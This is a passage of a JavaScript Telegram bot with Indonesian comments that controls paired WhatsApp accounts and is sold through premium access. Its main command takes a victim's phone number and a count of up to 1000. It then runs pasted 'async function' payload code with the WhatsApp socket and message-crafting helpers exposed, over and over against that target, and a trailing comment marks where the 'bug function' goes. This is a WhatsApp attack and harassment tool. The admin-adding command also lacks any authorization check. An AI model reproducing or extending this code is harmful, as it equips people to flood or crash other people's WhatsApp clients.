  const q = match[1];
  const jumlahInput = match[2];

  // 1. Abaikan jika pesan berasal dari private chat (sesuai fungsi shouldIgnoreMessage di index.js)
  if (shouldIgnoreMessage(msg)) return;

  // 2. Validasi Cooldown (sesuai fungsi checkCooldown di index.js)
  const cooldown = checkCooldown(senderId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum menggunakan command ini lagi.`);
  }

  // 3. Validasi Akses Premium (sesuai data premiumUsers di index.js)
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    const randomImage = getRandomImage(); // Menggunakan fungsi getRandomImage dari index.js
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur Test Function`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Putxzyy" }]]
      }
    });
  }

  try {
    // 4. Validasi Koneksi WhatsApp (menggunakan variabel sessions dari index.js)
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "🙈 Tidak ada bot WhatsApp yang terhubung.");
    }

    // 5. Validasi input jumlah
    const jumlah = Math.max(0, Math.min(parseInt(jumlahInput) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) {
      return bot.sendMessage(chatId, "❌ ☇ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // 6. Validasi Reply Function
    if (!msg.reply_to_message || !msg.reply_to_message.text) {
      return bot.sendMessage(chatId, "❌ ☇ Reply pesan yang berisi kode async function");
    }

    // 7. Kirim status awal menggunakan thumbnail 'kontolmedia' (buffer dari index.js)
    const processMsg = await bot.sendPhoto(chatId, kontolmedia, {
      caption: `<blockquote><pre>─━━─━━⧼ 𝐗𝐧𝐮𝐥𝐥 ⧽─━━─━━</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process...`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]]
      }
    });

    const processMessageId = processMsg.message_id;

    // 8. Eksekusi VM Sandbox (menggunakan variabel global yang ada di index.js)
    const funcCode = msg.reply_to_message.text;
    const funcMatch = funcCode.match(/async function\s+(\w+)/);
    
    if (!funcMatch) {
      return bot.sendMessage(chatId, "❌ ☇ Nama function tidak ditemukan (Gunakan format: async function nama() { ... })");
    }
    
    const funcName = funcMatch[1];
    const sandbox = {
      console,
      Buffer,
      sock, // Menggunakan variabel sock global dari index.js
      target,
      sleep, // Fungsi sleep dari index.js
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser
    };

    const vm = require('vm'); // Pastikan library vm terinstall/tersedia
    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    // Looping eksekusi
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(sock, target);
        } else {
          await fn(sock, target, true);
        }
      } catch (err) { /* ignore loop error */ }
      await sleep(200);
    }

    // 9. Update Status Sukses
    const finalText = `<blockquote><pre>─━━─━━⧼ 𝐗𝐧𝐮𝐥𝐥 ⧽─━━─━━</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Success Executed
⌑ Status: Completed ✅`;

    try {
      await bot.editMessageCaption(finalText, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]]
        }
      });
    } catch (e) {
      await bot.sendMessage(chatId, finalText, { parse_mode: "HTML" });
    }

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});


































//Owner
bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text) {
        return bot.sendMessage(chatId, "Mana Link Channel Nya?");
    }

    if (!text.includes("https://whatsapp.com/channel/")) {
        return bot.sendMessage(chatId, "Invalid link");
    }

    try {
        let result = text.split("https://whatsapp.com/channel/")[1];
        let res = await Xuu.newsletterMetadata("invite", result);

        let teks = `*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}`;

        bot.sendMessage(chatId, teks, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "Copy ID",
                            callback_data: `copy_${res.id}`
                        }
                    ]
                ]
            }
        });

    } catch (err) {
        bot.sendMessage(chatId, "Gagal mengambil data channel.");
        console.log(err);
    }
});

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "🙈 You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🙈 You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is not an admin.`);
    }
});

// isi function bug
